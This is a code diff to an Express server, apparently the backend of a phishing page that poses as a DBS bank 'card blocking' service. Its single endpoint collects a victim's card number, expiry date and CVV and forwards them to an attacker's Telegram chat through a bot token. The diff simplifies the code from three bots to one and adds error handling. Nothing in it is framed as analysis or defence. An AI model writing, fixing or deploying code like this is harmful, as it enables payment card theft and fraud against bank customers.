@@ -5,33 +5,31 @@ dotenv.config();
 
 const app = express();
 app.use(express.json());
-app.use(express.static(__dirname)); // Untuk mengakses file statis (HTML/CSS jika ada)
+app.use(express.static(__dirname + '/public')); // jika ada HTML/CSS
 
 app.post('/kirim-ke-telegram', async (req, res) => {
   const { nomor, valid, cvv } = req.body;
-
-  const message = `🔒 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
+  const message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
   const chat_id = process.env.CHAT_ID;
+  const token = process.env.BOT_TOKEN;
 
-  const tokens = [
-    process.env.BOT_TOKEN_1,
-    process.env.BOT_TOKEN_2,
-    process.env.BOT_TOKEN_3
-  ];
-
-try {
-  await Promise.all(tokens.map(async (token) => {
-    return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id,
-        text: message,
-        parse_mode: 'Markdown'
-      })
+      body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
     });
-  }));
 
-  res.sendStatus(200);
-} catch (error) {
-  res.status(500).send("Gagal kirim dari salah satu bot: " + error.message});
+    if (response.ok) {
+      res.sendStatus(200);
+    } else {
+      throw new Error("Gagal mengirim ke Telegram");
+    }
+  } catch (error) {
+    res.status(500).send("Gagal: " + error.message);
+  }
+});
+
+app.listen(3000, () => {
+  console.log('Server aktif di http://localhost:3000');
+});
